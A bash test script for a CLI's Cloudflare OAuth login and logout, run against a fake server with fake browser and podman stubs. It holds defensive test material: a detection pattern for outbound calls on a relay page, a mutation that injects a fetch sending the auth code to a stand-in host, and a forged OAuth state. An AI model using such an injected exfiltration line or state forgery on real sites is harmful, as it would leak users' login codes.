#!/usr/bin/env bash
# @trace order:1505-kc5f, openspec/changes/cloudflare-login-and-fleet-vpn/design.md (Decision 1, Decision 7)
# @trace openspec/changes/cloudflare-login-and-fleet-vpn/specs/cloudflare-auth/spec.md
#
# tillandsias --cloudflare-login [--via loopback|qr|paste] and
# --cloudflare-logout, against tillandsias-fake-cloudflare. No real
# Cloudflare, no real Vault, no real credential.
#
# Two kinds of arm, and why:
#   BIN   the REAL tillandsias binary, a fake browser opener (xdg-open/open)
#         first on PATH that performs the consent against the fake with curl,
#         and a fake podman (TILLANDSIAS_PODMAN_BIN, exits 125) so the binary
#         CANNOT reach this host's Vault even if a regression moved the Vault
#         preflight ahead of the receiver. Covers every arm that ends BEFORE
#         the store: deny, state mismatch, qr-no-relay, the qr render under
#         LITMUS_PODMAN_MODE, the litmus stop, paste-without-a-terminal, and
#         approve-with-Vault-unreachable (refused before the code is spent).
#   CARGO the SAME login()/logout() the binary's run_cli calls, in-process,
#         against the SAME fake over real loopback, with the in-memory Vault
#         seam (the 1505-iysn CloudflareTokenStore trait). Covers the arms
#         that STORE (loopback approve, paste, qr+relay poll) and logout: the
#         only production store is the live Vault, and no environment switch
#         may select another one, so a storing arm cannot run the binary
#         without touching a real Vault.
#
# Exit criteria (packet 1505-kc5f) -> arms:
#   loopback ?auto=approve -> ok:cloudflare-login:stored        CARGO loopback
#   ?auto=deny -> refused:...:access-denied, nothing past auth  BIN deny + CARGO deny
#   --via qr decodes to the authorize URL and nothing else      BIN qr-capture + CARGO qr
#   --via paste with a code from the fake stores                CARGO paste
#   --via qr without a relay refuses naming loopback and paste  BIN no-relay
#   LITMUS_PODMAN_MODE stops with nothing written               BIN litmus + CARGO litmus
#   --cloudflare-logout deletes token+refresh, keeps mesh       CARGO logout
# plus: state mismatch makes no exchange; no token, verifier or code in any
# output; the relay page never calls out (with two mutation controls).
#
# TILLANDSIAS_CLOUDFLARE_LOGIN_BIN=<path> runs the BIN arms against another
# binary: pointing it at a pre-1505-kc5f tillandsias makes every BIN arm FAIL
# ("Unsupported option: --cloudflare-login"), which is this script's
# negative control.
#
# PRE-FIX RESULT: FAILS — --cloudflare-login is an unknown flag and the
# cloudflare_login module, its tests and the relay page do not exist.
set -uo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT" || exit 2
FAIL=0
ok()  { printf 'ok:   %s\n' "$1"; }
bad() { printf 'FAIL: %s\n' "$1"; FAIL=1; }

command -v cargo >/dev/null 2>&1 || { echo "skip:cloudflare-login:no-cargo"; exit 3; }
command -v curl >/dev/null 2>&1 || { echo "skip:cloudflare-login:no-curl"; exit 3; }

scratch="$(mktemp -d "${TMPDIR:-/tmp}/cf-login.XXXXXX")"
FAKE_PIDS=""
cleanup() {
    for p in $FAKE_PIDS; do kill "$p" 2>/dev/null; done
    rm -rf "$scratch"
}
trap cleanup EXIT

echo "[cloudflare-login] building tillandsias and tillandsias-fake-cloudflare..." >&2
if ! cargo build -p tillandsias-headless --bin tillandsias --bin tillandsias-fake-cloudflare >"$scratch/build.log" 2>&1; then
    tail -20 "$scratch/build.log"
    echo "fail:cloudflare-login:build"
    exit 1
fi
TARGET="${CARGO_TARGET_DIR:-$ROOT/target}/debug"
FAKE="$TARGET/tillandsias-fake-cloudflare"
BIN="${TILLANDSIAS_CLOUDFLARE_LOGIN_BIN:-$TARGET/tillandsias}"
[ -x "$FAKE" ] || { echo "fail:cloudflare-login:fake-missing:$FAKE"; exit 1; }
[ -x "$BIN" ] || { echo "fail:cloudflare-login:binary-missing:$BIN"; exit 1; }

# ── the fake browser and the fake podman ────────────────────────────────────
FAKEBIN="$scratch/fakebin"
mkdir -p "$FAKEBIN" "$scratch/home" "$scratch/run"
chmod 700 "$scratch/run"
cat >"$FAKEBIN/xdg-open" <<'OPENER'
#!/usr/bin/env bash
# The operator's browser: consent at the fake (auto=approve|deny), then follow
# the redirect to the loopback listener. Records the URL and the Location in
# the scratch dir; prints nothing.
url="$1"
printf '%s\n' "$url" >"$CF_FAKE_BROWSER_DIR/url"
loc="$(curl -s --noproxy '*' -o /dev/null -w '%{redirect_url}' "${url}&auto=${CF_FAKE_BROWSER_MODE:-approve}")"
if [ "${CF_FAKE_BROWSER_TAMPER:-0}" = 1 ]; then
    loc="$(printf '%s' "$loc" | sed 's/state=/state=forged/')"
fi
printf '%s\n' "$loc" >"$CF_FAKE_BROWSER_DIR/location"
curl -s --noproxy '*' -o /dev/null "$loc" || true
OPENER
cp "$FAKEBIN/xdg-open" "$FAKEBIN/open"
printf '#!/bin/sh\nexit 125\n' >"$FAKEBIN/podman"
chmod 755 "$FAKEBIN/xdg-open" "$FAKEBIN/open" "$FAKEBIN/podman"

start_fake() {   # <name> -> sets FAKE_URL, LEDGER
    LEDGER="$scratch/$1.ledger"
    : >"$LEDGER"
    "$FAKE" --ledger "$LEDGER" >"$scratch/$1.port" 2>/dev/null &
    FAKE_PIDS="$FAKE_PIDS $!"
    local i=0 port=""
    while [ "$i" -lt 100 ]; do
        port="$(head -n 1 "$scratch/$1.port" 2>/dev/null)"
        [ -n "$port" ] && break
        sleep 0.1
        i=$((i + 1))
    done
    [ -n "$port" ] || { bad "fake for $1 printed no port"; FAKE_URL="http://127.0.0.1:1"; return; }
    FAKE_URL="http://127.0.0.1:$port"
}

# ledger_paths <ledger>: one request path (no query) per line, in order.
# A fake that received nothing may have written no ledger file at all.
ledger_paths() { [ -f "$1" ] || return 0; sed -n 's/.*"path":"\([^"?]*\).*/\1/p' "$1"; }
# past_auth <ledger>: the paths recorded AFTER the first /oauth2/auth.
past_auth() { ledger_paths "$1" | awk 'seen { print } $0 == "/oauth2/auth" { seen = 1 }'; }

# run_bin <name> <extra-env...> -- <args...>: the real binary, isolated from
# this host's Vault, podman, D-Bus and proxies, with a 60 s watchdog.
run_bin() {
    local name="$1"; shift
    local envs=()
    while [ "$#" -gt 0 ] && [ "$1" != "--" ]; do envs+=("$1"); shift; done
    shift
    mkdir -p "$scratch/$name.browser"
    env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY \
        -u TILLANDSIAS_CLOUDFLARE_RELAY_URL -u TILLANDSIAS_CLOUDFLARE_RELAY_POLL_URL \
        -u LITMUS_PODMAN_MODE -u TILLANDSIAS_HOST_KIND \
        NO_PROXY='127.0.0.1,localhost' no_proxy='127.0.0.1,localhost' \
        PATH="$FAKEBIN:$PATH" HOME="$scratch/home" XDG_RUNTIME_DIR="$scratch/run" \
        DBUS_SESSION_BUS_ADDRESS='unix:path=/nonexistent/bus' \
        TILLANDSIAS_PODMAN_BIN="$FAKEBIN/podman" TILLANDSIAS_PODMAN_REFUSE_REAL=1 \
        TILLANDSIAS_NO_TRAY=1 NO_COLOR=1 \
        TILLANDSIAS_CLOUDFLARE_BASE_URL="$FAKE_URL" TILLANDSIAS_CLOUDFLARE_CLIENT_ID=fake-client \
        CF_FAKE_BROWSER_DIR="$scratch/$name.browser" \
        "${envs[@]+"${envs[@]}"}" \
        "$BIN" "$@" >"$scratch/$name.out" 2>&1 </dev/null &
    local pid=$!
    ( sleep 60; kill "$pid" 2>/dev/null ) &
    local wd=$!
    wait "$pid"
    RC=$?
    kill "$wd" 2>/dev/null
    wait "$wd" 2>/dev/null
    OUT="$(cat "$scratch/$name.out")"
}

# code_of <name>: the code the fake issued in that arm (read by the fake
# browser from the Location), for the no-leak checks. Never printed.
code_of() { sed -n 's/.*[?&]code=\([^&]*\).*/\1/p' "$scratch/$1.browser/location" 2>/dev/null | head -n 1; }

no_leak() {   # <label> <text> <secret>...
    local label="$1" text="$2"; shift 2
    local s
    for s in "$@"; do
        # The population must exist: an empty probe would make this pass
        # without having looked at anything.
        [ "${#s}" -ge 8 ] || { bad "NOLEAK $label: no secret to look for (the probe is empty)"; return; }
        case "$text" in *"$s"*) bad "NOLEAK $label: a secret reached the output"; return ;; esac
    done
    case "$text" in *code_verifier*) bad "NOLEAK $label: a verifier parameter reached the output"; return ;; esac
    ok "NOLEAK $label"
}

# ── BIN arms ────────────────────────────────────────────────────────────────
echo "[cloudflare-login] BIN arms against the real binary..." >&2

start_fake deny
run_bin deny CF_FAKE_BROWSER_MODE=deny -- --cloudflare-login --via loopback
if [ "$RC" -ne 0 ] && grep -q '^refused:cloudflare-login:access-denied$' <<<"$OUT" \
    && grep -q '^  remedy: ' <<<"$OUT"; then
    ok "DENY bin: refused:cloudflare-login:access-denied (why/remedy present)"
else
    bad "DENY bin: expected refused:cloudflare-login:access-denied, rc=$RC"
    printf '%s\n' "$OUT" | head -5
fi
if ledger_paths "$LEDGER" | grep -qx '/oauth2/auth' && [ -z "$(past_auth "$LEDGER")" ]; then
    ok "DENY bin: the ledger shows nothing past /oauth2/auth"
else
    bad "DENY bin: requests past /oauth2/auth (or no consent at all): $(ledger_paths "$LEDGER" | tr '\n' ' ')"
fi

start_fake state
run_bin state CF_FAKE_BROWSER_MODE=approve CF_FAKE_BROWSER_TAMPER=1 -- --cloudflare-login --via loopback
if [ "$RC" -ne 0 ] && grep -q '^refused:cloudflare-login:state-mismatch$' <<<"$OUT"; then
    ok "STATE bin: a tampered state is refused"
else
    bad "STATE bin: expected refused:cloudflare-login:state-mismatch, rc=$RC"
fi
if ledger_paths "$LEDGER" | grep -qx '/oauth2/auth' && ! ledger_paths "$LEDGER" | grep -qx '/oauth2/token'; then
    ok "STATE bin: no /oauth2/token request was made"
else
    bad "STATE bin: the ledger shows a token request (or no consent): $(ledger_paths "$LEDGER" | tr '\n' ' ')"
fi
no_leak "state" "$OUT" "$(code_of state)"

start_fake novault
run_bin novault CF_FAKE_BROWSER_MODE=approve -- --cloudflare-login --via loopback
if [ "$RC" -ne 0 ] && grep -q '^refused:cloudflare-login:vault:vault-unavailable$' <<<"$OUT" \
    && ! ledger_paths "$LEDGER" | grep -qx '/oauth2/token' && ledger_paths "$LEDGER" | grep -qx '/oauth2/auth'; then
    ok "NOVAULT bin: approved, Vault unreachable -> refused before the code is spent (no /oauth2/token)"
else
    bad "NOVAULT bin: expected refused:cloudflare-login:vault:vault-unavailable and no token request, rc=$RC"
    printf '%s\n' "$OUT" | head -5
fi
no_leak "novault" "$OUT" "$(code_of novault)"

start_fake norelay
run_bin norelay -- --cloudflare-login --via qr
if [ "$RC" -ne 0 ] && grep -q '^refused:cloudflare-login:no-relay-configured$' <<<"$OUT" \
    && grep -q -- '--via loopback' <<<"$OUT" && grep -q -- '--via paste' <<<"$OUT"; then
    ok "NORELAY bin: --via qr without a relay refuses, naming --via loopback and --via paste"
else
    bad "NORELAY bin: expected refused:cloudflare-login:no-relay-configured naming both receivers, rc=$RC"
fi
[ -s "$LEDGER" ] && bad "NORELAY bin: the fake was contacted before the refusal" || ok "NORELAY bin: refused before any request"

RELAY='https://relay.example.invalid/tillandsias/cloudflare/callback'
start_fake qr
run_bin qr LITMUS_PODMAN_MODE=1 TILLANDSIAS_CLOUDFLARE_RELAY_URL="$RELAY" -- --cloudflare-login --via qr
QR_CAPTURE="$scratch/qr.out"
if [ "$RC" -eq 0 ] && grep -q '^skip:cloudflare-login:litmus-stop-before-exchange' <<<"$OUT" \
    && grep -q 'Or open: ' <<<"$OUT"; then
    ok "QR bin: rendered the QR and the URL, then stopped (litmus)"
else
    bad "QR bin: expected a QR, the URL and the litmus stop, rc=$RC"
fi

start_fake litmus
run_bin litmus LITMUS_PODMAN_MODE=1 CF_FAKE_BROWSER_MODE=approve -- --cloudflare-login --via loopback
if [ "$RC" -eq 0 ] && grep -q '^skip:cloudflare-login:litmus-stop-before-exchange' <<<"$OUT" \
    && [ "$(ledger_paths "$LEDGER" | sort -u)" = "/.well-known/openid-configuration" ] \
    && [ ! -e "$scratch/litmus.browser/url" ]; then
    ok "LITMUS bin: stopped before the browser, the receiver and the exchange (discovery only)"
else
    bad "LITMUS bin: expected the stop with discovery-only ledger and no browser, rc=$RC: $(ledger_paths "$LEDGER" | tr '\n' ' ')"
fi
# CONTROL: the same invocation WITHOUT the litmus flag goes past the stop.
start_fake litmusctl
run_bin litmusctl CF_FAKE_BROWSER_MODE=deny -- --cloudflare-login --via loopback
if ! grep -q 'litmus-stop' <<<"$OUT" && [ -e "$scratch/litmusctl.browser/url" ]; then
    ok "LITMUS CONTROL: without LITMUS_PODMAN_MODE the browser is opened"
else
    bad "LITMUS CONTROL: the stop fired (or no browser) without the litmus flag"
fi

start_fake pastetty
run_bin pastetty -- --cloudflare-login --via paste
if [ "$RC" -ne 0 ] && grep -q '^refused:cloudflare-login:paste-needs-a-terminal$' <<<"$OUT" \
    && grep -q 'CODE (not a token)' <<<"$OUT" && [ ! -s "$LEDGER" ]; then
    ok "PASTE bin: without a terminal it refuses (a CODE, not a token) before any request"
else
    bad "PASTE bin: expected refused:cloudflare-login:paste-needs-a-terminal, rc=$RC"
fi

run_bin argv -- --cloudflare-login --via paste 'CODEONARGV-0123456789'
if [ "$RC" -eq 2 ] && grep -q '^refused:cloudflare-login:unsupported-argument$' <<<"$OUT"; then
    ok "ARGV bin: a positional (a code on argv) is refused"
else
    bad "ARGV bin: expected refused:cloudflare-login:unsupported-argument rc=2, rc=$RC"
fi
no_leak "argv" "$OUT" "CODEONARGV-0123456789"

# LEDGER CONTROL: past_auth sees a request after /oauth2/auth when there is one.
printf '%s\n' '{"body":"","method":"GET","path":"/oauth2/auth?x=1"}' \
    '{"body":"grant_type=authorization_code","method":"POST","path":"/oauth2/token"}' >"$scratch/ctl.ledger"
[ "$(past_auth "$scratch/ctl.ledger")" = "/oauth2/token" ] \
    && ok "LEDGER CONTROL: the past-auth check sees a token request" \
    || bad "LEDGER CONTROL: the past-auth check is blind"

# ── the relay page never calls out ──────────────────────────────────────────
PAGE="$ROOT/assets/cloudflare-relay/index.html"
relay_page_ok() {   # <file>: 0 when the page is static, reads code+state, never calls out
    local body
    body="$(awk '
        { line = $0 }
        incomment { if (index(line, "-->")) { line = substr(line, index(line, "-->") + 3); incomment = 0 } else next }
        { while (index(line, "<!--")) {
              pre = substr(line, 1, index(line, "<!--") - 1); rest = substr(line, index(line, "<!--") + 4)
              if (index(rest, "-->")) { line = pre substr(rest, index(rest, "-->") + 3) } else { line = pre; incomment = 1 } }
          print line }' "$1")"
    grep -q "connect-src 'none'" <<<"$body" || return 1
    grep -q "default-src 'none'" <<<"$body" || return 1
    grep -Eq 'fetch\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource|import\(|<form|<img|<link|<iframe|<object|<embed|[[:space:]]src=|href=|innerHTML|outerHTML|insertAdjacentHTML|document\.write|https?://' <<<"$body" && return 1
    grep -q 'new URLSearchParams(window.location.search)' <<<"$body" || return 1
    grep -q '"code=" + code + "&state=" + state' <<<"$body" || return 1
    grep -q 'textContent' <<<"$body" || return 1
    grep -q 'history.replaceState' <<<"$body" || return 1
    return 0
}
if [ -r "$PAGE" ] && relay_page_ok "$PAGE"; then
    ok "RELAY page: static, shows code=…&state=… from its query, CSP connect-src 'none', no outbound call"
else
    bad "RELAY page: missing, or it can call out / does not render code and state"
fi
if [ -r "$PAGE" ]; then
    sed 's|show("ok");|show("ok"); fetch("https://x.invalid/?" + line);|' "$PAGE" >"$scratch/relay-fetch.html"
    if cmp -s "$PAGE" "$scratch/relay-fetch.html"; then
        bad "RELAY CONTROL fetch: the mutation did not reach"
    elif relay_page_ok "$scratch/relay-fetch.html"; then
        bad "RELAY CONTROL fetch: a page that POSTs the code out was NOT caught"
    else
        ok "RELAY CONTROL fetch: a page that calls out is caught"
    fi
    sed "s|connect-src 'none'; ||" "$PAGE" >"$scratch/relay-csp.html"
    if cmp -s "$PAGE" "$scratch/relay-csp.html"; then
        bad "RELAY CONTROL csp: the mutation did not reach"
    elif relay_page_ok "$scratch/relay-csp.html"; then
        bad "RELAY CONTROL csp: dropping connect-src 'none' was NOT caught"
    else
        ok "RELAY CONTROL csp: dropping connect-src 'none' is caught"
    fi
fi

# ── CARGO arms (the storing flows, in-process, same fake) ──────────────────
echo "[cloudflare-login] CARGO arms (in-process login/logout against the fake)..." >&2
out="$(TILLANDSIAS_FAKE_CLOUDFLARE_BIN="$FAKE" CF_LOGIN_QR_CAPTURE="$QR_CAPTURE" CF_LOGIN_QR_RELAY="$RELAY" \
    cargo test -p tillandsias-headless --bin tillandsias cloudflare_login::tests:: -- --include-ignored 2>&1)"
rc=$?
T="cloudflare_login::tests"
ARMS="LOOPBACK|cloudflare_login_fake_loopback_approve_stores
DENY|cloudflare_login_fake_deny_writes_nothing
STATE|cloudflare_login_fake_state_mismatch_makes_no_exchange
QR|cloudflare_login_fake_qr_relay_poll_stores_and_qr_is_only_the_url
QR-BIN-DECODE|cloudflare_login_binary_qr_capture_is_only_the_authorize_url
PASTE|cloudflare_login_fake_paste_stores
LITMUS|cloudflare_login_fake_litmus_stops_before_exchange
LOGOUT|cloudflare_logout_fake_deletes_pair_keeps_mesh
LOGOUT-UNIT|cloudflare_logout_deletes_the_pair_and_keeps_mesh
LOGOUT-VAULT|cloudflare_logout_refuses_when_vault_is_unreadable
STATE-FIRST|cloudflare_login_state_is_checked_before_error_and_code
ONE-CALLBACK|cloudflare_login_loopback_takes_exactly_one_callback_then_closes
WRONG-STATE-CLOSES|cloudflare_login_loopback_wrong_state_is_refused_and_closes
TIMEOUT|cloudflare_login_loopback_times_out_and_closes
LOOPBACK-ONLY|cloudflare_login_loopback_binds_127_0_0_1_on_registered_ports_only
PREFLIGHT|cloudflare_login_vault_preflight_refuses_before_the_code_is_spent
EXCHANGE-NOLEAK|cloudflare_login_exchange_refusal_carries_no_response_bytes
FORGE|cloudflare_login_and_logout_refuse_in_a_forge_without_touching_anything
NORELAY|cloudflare_login_qr_without_relay_is_refused_before_any_network_call
PASTE-TTY|cloudflare_login_paste_without_a_terminal_is_refused_before_any_network_call
POLL|cloudflare_login_relay_poll_state_first_then_code
PASTE-STATE|cloudflare_login_paste_needs_the_state_with_the_code
ARGS|cloudflare_login_parse_args"
while IFS= read -r line; do
    label="${line%%|*}"; arm="${line#*|}"
    if grep -qE "^test ${T}::${arm} \.\.\. ok$" <<<"$out"; then
        ok "CARGO $label $arm"
    else
        bad "CARGO $label $arm"
    fi
done <<<"$ARMS"
if [ "$rc" -ne 0 ]; then
    grep -E "panicked|FAILED|^error" <<<"$out" | head -12
    bad "cargo test exited $rc"
fi

if [ "$FAIL" -eq 0 ]; then
    echo "ok:cloudflare-login:all-arms+controls"
    exit 0
fi
echo "fail:cloudflare-login"
exit 1
